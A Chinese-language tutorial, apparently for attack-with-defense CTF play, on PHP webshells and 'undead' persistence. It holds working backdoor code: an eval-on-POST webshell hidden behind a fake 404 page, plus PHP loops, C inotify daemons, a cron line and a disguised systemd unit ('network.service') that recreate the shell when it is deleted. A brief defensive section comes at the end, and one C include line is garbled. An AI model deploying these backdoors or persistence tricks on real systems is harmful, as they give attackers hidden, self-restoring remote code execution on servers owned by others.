## preg_replace

在 php < 5.5 中，preg_replace 函数的第三个参数可以使用 `/e` 修饰符来执行替换后的字符串作为 PHP 代码，这就导致了远程代码执行漏洞。

该功能自 5.5 起弃用，并在 7.0 中完全移除

```php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">

<html><head>

<title>404 Not Found</title>

</head><body>

<h1>Not Found</h1>

<p>The requested URL was not found on this server.</p>

</body></html>

<?php if(md5($_GET['pass'])=='d153bd338e94e8f655b2f653d92daae2'){ @preg_replace("/[pageerror]/e",$_POST['cmd'],"saft"); } header('HTTP/1.1 404 Not Found');

?>
```

## 不死马

不死马是指难以被删除、可以自动恢复的webshell持久化后门，在AWD中可以用来持续获取靶机的访问权限，甚至在被攻击或服务非正常运行时也能保持访问权限。

### 循环写入式

最简单的实现方式是通过一个循环不断写入webshell文件，若文件被删除则会自动恢复

```php
<?php
    const FILEPATH = "/var/www/html/shell.php";
    const PAYLOAD = "<?php if(md5($_GET['pass'])=='d153bd338e94e8f655b2f653d92daae2'){@eval($_POST['cmd']);} ?>\n";
    while(true){
        if(!file_exists(FILEPATH)){
            file_put_contents(FILEPATH, PAYLOAD);
        }
        sleep(0.1);
    }
?>
```

但是这种方式只有单一进程且进程可见，会持续占用设备资源，极易被发现和删除

### 双进程守护

通过两个进程互相监视对方的状态，如果其中一个进程被杀死，另一个进程会立即重启它，从而实现不死马的效果

### inotify文件监听型(Linux)

通过 inotify 监听文件系统事件，当webshell文件被删除时触发事件处理程序重新创建文件

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/inotify.h>
#include <unistd.h>
#include <limits.h>f
#include <linux/limits.h>

#define EVENT_SIZE  (sizeof(struct inotify_event))
#define BUF_LEN     (1024 * (EVENT_SIZE + NAME_MAX + 1))

const char filepath[] = "/var/www/html/shell.php";
const char payload[] = "<?php if(md5($_GET['pass'])=='d153bd338e94e8f655b2f653d92daae2'){@eval($_POST['cmd']);} ?>\n";

int main() {
    int fd = inotify_init();
    if (fd < 0) {
        perror("inotify_init");
        exit(EXIT_FAILURE);
    }

    int wd = inotify_add_watch(fd, filepath, IN_DELETE_SELF);
    if (wd == -1) {
        perror("inotify_add_watch");
        exit(EXIT_FAILURE);
    }

    printf("Is monitoring %s for deletion...\n", filepath);

    char buffer[BUF_LEN];

    while (1) {
        int length = read(fd, buffer, BUF_LEN);

        if (length < 0) {
            perror("read");
            exit(EXIT_FAILURE);
        }

        struct inotify_event *event = (struct inotify_event *) buffer;

        if (event->mask & IN_DELETE_SELF) {
            printf("File %s was deleted\n", filepath);
            restore_file();
        }
    }

    inotify_rm_watch(fd, wd);
    close(fd);
    return 0;
}

void restore_file() {
    FILE* fp = fopen(filepath, "w");
    if (fp == NULL) {
        perror("fopen");
        return;
    }

    fprintf(fp, "%s", payload);
    fclose(fp);
    printf("File %s has been restored with payload.\n", filepath);
}
```

下面这个代码进行了更多优化

```c
#include <errno.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/inotify.h>
#include <unistd.h>
#include <linux/limits.h>

#define EVENT_SIZE (sizeof(struct inotify_event))
#define BUF_LEN (1024 * (EVENT_SIZE + NAME_MAX + 1))

const char filepath[] = "/var/www/html/shell.php";
const char payload[] = "<?php if(md5($_GET['pass'])=='d153bd338e94e8f655b2f653d92daae2'){@eval($_POST['cmd']);} ?>\n";

void restore_file(void);
int add_watch(int fd);

int main() {
    int fd = inotify_init1(0);
    if (fd < 0) {
        perror("inotify_init1");
        exit(EXIT_FAILURE);
    }

    int wd = add_watch(fd);
    if (wd < 0) {
        close(fd);
        exit(EXIT_FAILURE);
    }

    printf("Monitoring %s ...\n", filepath);

    char buffer[BUF_LEN];

    while (1) {
        int length = read(fd, buffer, BUF_LEN);

        if (length < 0) {
            if (errno == EINTR)
                continue;
            perror("read");
            break;
        }

        int i = 0;
        while (i < length) {
            struct inotify_event* event =
                (struct inotify_event*)&buffer[i];

            if (event->mask & (IN_DELETE_SELF | IN_MOVE_SELF)) {
                printf("File was removed or moved. Restoring...\n");

                restore_file();

                wd = add_watch(fd);
                if (wd < 0) {
                    close(fd);
                    exit(EXIT_FAILURE);
                }
            }

            if (event->mask & IN_Q_OVERFLOW) {
                fprintf(stderr, "Inotify queue overflow!\n");
            }

            i += EVENT_SIZE + event->len;
        }
    }

    close(fd);
    return 0;
}

int add_watch(int fd) {
    int wd = inotify_add_watch(
        fd,
        filepath,
        IN_DELETE_SELF | IN_MOVE_SELF);

    if (wd < 0) {
        perror("inotify_add_watch");
    }

    return wd;
}

void restore_file(void) {
    FILE* fp = fopen(filepath, "w");
    if (!fp) {
        perror("fopen");
        return;
    }

    fprintf(fp, "%s", payload);
    fclose(fp);

    printf("File restored successfully.\n");
}
```

### 定时任务

通过 crontab 定时检查webshell文件是否存在，如果被删除则重新创建

```bash
* * * * * /usr/bin/test -f /var/www/html/shell.php || echo "<?php if(md5($_GET['pass'])=='d153bd338e94e8f655b2f653d92daae2'){@eval($_POST['cmd']);} ?>" > /var/www/html/shell.php
```

但是防守方很容易可以通过定时查看 cron `crontab -l` 来发现这个定时任务

### service 持久化(sudo)

通过创建一个 systemd service 来实现持久化，service 可以设置为开机自启，并且不容易被发现和删除

创建文件 `/etc/systemd/system/network.service`

```toml
[Unit]
Description=Network Service
[Service]
ExecStart=/usr/bin/bash -c 'while true; do if [ ! -f /var/www/html/shell.php ]; then echo "<?php if(md5($_GET['pass'])=='d153bd338e94e8f655b2f653d92daae2'){@eval($_POST['cmd']);} ?>" > /var/www/html/shell.php; fi; sleep 60; done'
[Install]
WantedBy=multi-user.target
```

执行命令运行服务

```bash
systemctl daemon-reload
systemctl enable network.service
systemctl start network.service
```

### **内存马**

Java 内存马最为常见，主要使用 Apache Tomcat 服务器的 Servlet、Filter、Listener 来实现持久化，另外基于 SpringBoot 的内存马也比较常见

对于其他后端语言的内存马实现相对较少，主要是因为它们没有像 Java 那样的类加载机制和反射功能，使得在内存中动态加载和执行代码变得更加困难。

### 防御措施

内存马一般依赖于已有进程而存在，因此可以通过重启进程来实现清除木马

其他大部分木马需要依赖自身进程或者系统服务来实现持久化，所以可以对这些进程和服务进行定期审查和监控，及时发现异常行为并采取反制措施。

此类依赖写入保活的木马，可以利用 **条件竞争** 方式来实现防御，不断写入木马，以致无法使用

```php
<?php
    const FILEPATH = "/var/www/html/shell.php";
    const PAYLOAD = "Got you Hacker\n";
    while(true){
        if(file_exists(FILEPATH)){
            file_put_contents(FILEPATH, PAYLOAD);
        }
        sleep(0.1);
    }
?>
```

```python
import os
import time

path = "/var/www/html/shell.php"
payload = "Got you Hacker\n"
while True:
    if os.path.exists(path):
        with open(path, "w") as f:
            f.write(payload)
    time.sleep(0.1)
```
